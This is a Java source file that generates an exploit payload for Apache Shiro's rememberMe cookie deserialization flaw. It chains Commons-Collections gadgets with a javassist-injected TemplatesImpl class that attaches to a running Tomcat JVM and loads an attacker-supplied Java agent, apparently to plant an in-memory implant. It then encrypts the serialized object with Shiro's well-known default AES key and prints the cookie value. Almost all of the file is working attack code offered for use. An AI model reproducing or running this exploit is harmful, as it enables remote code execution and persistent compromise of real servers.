package org.chabug.demo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.Reflections;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Field;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

// 依赖 commons-collections:commons-collections:3.2.1
// 依赖于 ysoserial javassist
public class CC10 {

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(command, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")) : createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(String agentPath, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = String.format(
                "        try {\n" +
                        "java.io.File toolsJar = new java.io.File(System.getProperty(\"java.home\").replaceFirst(\"jre\", \"lib\") + java.io.File.separator + \"tools.jar\");\n" +
                        "java.net.URLClassLoader classLoader = (java.net.URLClassLoader) java.lang.ClassLoader.getSystemClassLoader();\n" +
                        "java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod(\"addURL\", new java.lang.Class[]{java.net.URL.class});\n" +
                        "add.setAccessible(true);\n" +
                        "            add.invoke(classLoader, new Object[]{toolsJar.toURI().toURL()});\n" +
                        "Class/*<?>*/ MyVirtualMachine = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachine\");\n" +
                        "            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachineDescriptor\");" +
                        "java.lang.reflect.Method list = MyVirtualMachine.getDeclaredMethod(\"list\", null);\n" +
                        "            java.util.List/*<Object>*/ invoke = (java.util.List/*<Object>*/) list.invoke(null, null);" +
                        "for (int i = 0; i < invoke.size(); i++) {" +
                        "Object o = invoke.get(i);\n" +
                        "                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod(\"displayName\", null);\n" +
                        "                Object name = displayName.invoke(o, null);\n" +
                        "if (name.toString().contains(\"org.apache.catalina.startup.Bootstrap\")) {" +
                        "                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\"attach\", new Class[]{MyVirtualMachineDescriptor});\n" +
                        "                    Object machine = attach.invoke(MyVirtualMachine, new Object[]{o});\n" +
                        "                    java.lang.reflect.Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"loadAgent\", new Class[]{String.class});\n" +
                        "                    loadAgent.invoke(machine, new Object[]{\"%s\"});\n" +
                        "                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\"detach\", null);\n" +
                        "                    detach.invoke(machine, null);\n" +
                        "                    break;\n" +
                        "}" +
                        "}" +
                        "} catch (Exception e) {\n" +
                        "            e.printStackTrace();\n" +
                        "        }"
                , agentPath.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));

        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        byte[] classBytes = clazz.toBytecode();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static String classAsFile(Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }

        if (suffix) {
            str = str + ".class";
        }

        return str;
    }

    public static byte[] classAsBytes(Class<?> clazz) {
        try {
            byte[] buffer = new byte[1024];
            String file = classAsFile(clazz);
            InputStream in = CC10.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            } else {
                ByteArrayOutputStream out = new ByteArrayOutputStream();

                int len;
                while ((len = in.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }

                return out.toByteArray();
            }
        } catch (IOException var6) {
            throw new RuntimeException(var6);
        }
    }


    public static void main(String[] args) throws Exception {
        // this is your agent path
        String command = "E:\\code\\java\\MyAgent\\out\\artifacts\\MyAgent_jar\\MyAgent.jar";
        Object templates = createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var17) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = null;
        innimpl = (HashMap) f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var16) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = new Object[0];
        array = (Object[]) ((Object[]) f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var15) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        byte[] bytes = Serializables.serializeToBytes(map);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        System.out.println(rememberMe);
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;

        public Foo() {
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload() {
        }

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }


}

class Serializables {
    public static byte[] serializeToBytes(final Object obj) throws Exception {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        return out.toByteArray();
    }


    public static Object deserializeFromBytes(final byte[] serialized) throws Exception {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

    public static void serializeToFile(String path, Object obj) throws Exception {
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将obj对象写入object文件
        os.writeObject(obj);
        os.close();
    }

    public static Object serializeFromFile(String path) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        // 通过Object的readObject()恢复对象
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }

}


class EncryptUtil {
    private static final String ENCRY_ALGORITHM = "AES";
    private static final String CIPHER_MODE = "AES/CBC/PKCS5Padding";
    private static final byte[] IV = "aaaaaaaaaaaaaaaa".getBytes();     // 16字节IV

    public EncryptUtil() {
    }

    public static byte[] encrypt(byte[] clearTextBytes, byte[] pwdBytes) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(pwdBytes, ENCRY_ALGORITHM);
            Cipher cipher = Cipher.getInstance(CIPHER_MODE);
            IvParameterSpec iv = new IvParameterSpec(IV);
            cipher.init(1, keySpec, iv);
            byte[] cipherTextBytes = cipher.doFinal(clearTextBytes);
            return cipherTextBytes;
        } catch (NoSuchPaddingException var6) {
            var6.printStackTrace();
        } catch (NoSuchAlgorithmException var7) {
            var7.printStackTrace();
        } catch (BadPaddingException var8) {
            var8.printStackTrace();
        } catch (IllegalBlockSizeException var9) {
            var9.printStackTrace();
        } catch (InvalidKeyException var10) {
            var10.printStackTrace();
        } catch (Exception var11) {
            var11.printStackTrace();
        }

        return null;
    }

    public static String shiroEncrypt(String key, byte[] objectBytes) {
        byte[] pwd = Base64.decode(key);
        byte[] cipher = encrypt(objectBytes, pwd);

        assert cipher != null;

        byte[] output = new byte[pwd.length + cipher.length];
        byte[] iv = IV;
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(cipher, 0, output, pwd.length, cipher.length);
        return Base64.encode(output);
    }
}
